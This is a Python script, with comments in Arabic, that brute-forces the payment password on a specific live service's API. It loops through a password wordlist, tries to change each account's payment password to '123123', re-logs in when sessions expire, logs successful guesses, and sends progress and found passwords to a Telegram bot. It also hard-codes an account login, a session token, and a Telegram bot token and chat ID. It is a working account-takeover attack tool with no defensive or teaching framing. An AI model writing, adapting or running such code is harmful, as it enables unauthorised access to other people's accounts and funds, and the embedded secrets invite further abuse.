import requests
import threading
import json

# إعداد الهيدرز
headers = {
    'authority': 'btsmoa.btswork.vip',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,ar-AE;q=0.7,ar;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://btswork.com',
    'referer': 'https://btswork.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

# ملفات البيانات
password_file = "passwordss.txt"
progress_file = "progress.txt"
success_file = "success.txt"
responses_file = "responses.txt"  # ملف لحفظ الردود مع الباسوردات

# بيانات تسجيل الدخول
login_data = {
    'username': '1281811280',
    'password': '123456',
    'lang': 'eg',
}

# توكن المستخدم
token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"

# توكن بوت تيليجرام
telegram_bot_token = "6724140823:AAE1pkFDNCAaKa1ahmXan8EJGyCNoTFTpg0"
telegram_chat_id = "1701465279"

# اقرأ آخر سطر تمت تجربته
try:
    with open(progress_file, "r") as f:
        last_line = int(f.read().strip())
except FileNotFoundError:
    last_line = 0  

# اقرأ كلمات المرور
try:
    with open(password_file, "r") as f:
        passwords = f.readlines()
except FileNotFoundError:
    print("ملف الباسوردات غير موجود.")
    exit()

if last_line >= len(passwords):
    print("تم تجربة جميع كلمات المرور.")
    exit()


# دالة إرسال إشعار إلى تيليجرام
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    data = {"chat_id": telegram_chat_id, "text": message}
    try:
        requests.post(url, data=data)
    except requests.exceptions.RequestException as e:
        print(f"خطأ أثناء إرسال رسالة تيليجرام: {e}")


# دالة إعادة تسجيل الدخول
def relogin():
    global token  
    print("إعادة تسجيل الدخول للحصول على توكن جديد...")
    
    try:
        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', headers=headers, data=login_data)
        if response.status_code == 200:
            result = response.json()
            if "info" in result and "token" in result["info"]:
                token = result["info"]["token"]  # تحديث التوكن الجديد
                print(f"تم الحصول على التوكن الجديد: {token}")
                return True
            else:
                print("فشل الحصول على التوكن! الرد:", result)
                return False
        else:
            print("فشل تسجيل الدخول! كود الحالة:", response.status_code)
            return False
    except requests.exceptions.RequestException as e:
        print(f"خطأ أثناء تسجيل الدخول: {e}")
        return False


# دالة تجربة كلمة المرور
def try_password(password_index):
    global token  

    o_payword = passwords[password_index].strip()
    print(f"جاري التجربة باستخدام الباسورد: {o_payword}")

    data = {
        'o_payword': o_payword,
        'n_payword': '123123',  
        'r_payword': '123123',  
        'lang': 'eg',
        'token': token,  
    }

    try:
        response = requests.post('https://btsmoa.btswork.vip/api/user/setuserinfo', headers=headers, data=data)
        print(f"الحالة: {response.status_code}, الرد: {response.text}")

        # تحويل الرد إلى JSON مع تجنب الأخطاء
        try:
            response_json = response.json()
        except json.JSONDecodeError:
            response_json = {}

        # التحقق مما إذا كان الرد يشير إلى انتهاء الجلسة
        if "code" in response_json and response_json["code"] in [203, 204]:
            print("الجلسة انتهت، سيتم تسجيل الدخول مرة أخرى...")
            if relogin():
                print("إعادة المحاولة باستخدام نفس كلمة المرور...")
                try_password(password_index)  # إعادة التجربة بعد تسجيل الدخول
            else:
                print("فشل تسجيل الدخول، سيتم تخطي كلمة المرور.")
            return

        # إرسال إشعار بعد كل 100 محاولة
        if password_index % 100 == 0:
            send_telegram_message(f"تمت تجربة {password_index} كلمة مرور حتى الآن.")

        # إذا كان "code_dec" يساوي 1، احفظ الرد وأرسل إشعارًا
        if "code_dec" in response_json and response_json["code_dec"] == 1:
            with open(responses_file, "a") as rf:
                rf.write(f"Password: {o_payword}
Response: {json.dumps(response_json, ensure_ascii=False)}

")
            print(f"تم حفظ الرد مع الباسورد: {o_payword}")
            send_telegram_message(f"تم العثور على كلمة مرور صحيحة: {o_payword}")

        # تحقق مما إذا كانت العملية ناجحة
        if "نجاح" in response.text:  
            print(f"تمت العملية بنجاح باستخدام الباسورد: {o_payword}")
            with open(success_file, "a") as sf:
                sf.write(o_payword + "\n")

    except requests.exceptions.RequestException as e:
        print(f"حدث خطأ أثناء إرسال الطلب: {e}")

    # تحديث التقدم
    with open(progress_file, "w") as pf:
        pf.write(str(password_index + 1))


# إدارة الخيوط لتجربة كلمات المرور
threads = []
for i in range(last_line, len(passwords)):
    thread = threading.Thread(target=try_password, args=(i,))
    threads.append(thread)
    thread.start()

    if len(threads) >= 1:
        for t in threads:
            t.join()
        threads = []  

for t in threads:
    t.join()

print("تمت تجربة جميع كلمات المرور أو انتهاء العملية.")
